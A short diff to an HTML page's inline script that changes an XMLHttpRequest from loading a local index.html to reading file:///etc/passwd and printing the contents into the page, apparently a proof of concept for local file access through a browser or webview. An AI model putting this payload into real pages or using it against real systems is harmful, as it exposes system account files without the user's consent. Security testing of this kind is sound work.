@@ -6,7 +6,8 @@
 <script>
 document.getElementById('response').innerHTML = "Loading...";
 var x = new XMLHttpRequest();
-x.open("GET", "file://./index.html", false);
+x.open("GET", "file:///etc/passwd", false);
+x.overrideMimeType("text/plain; charset=UTF-8");
 x.send();
 document.getElementById('response').innerHTML = "Response: "+ x.statusText + " \n\n" + x.responseText;
   
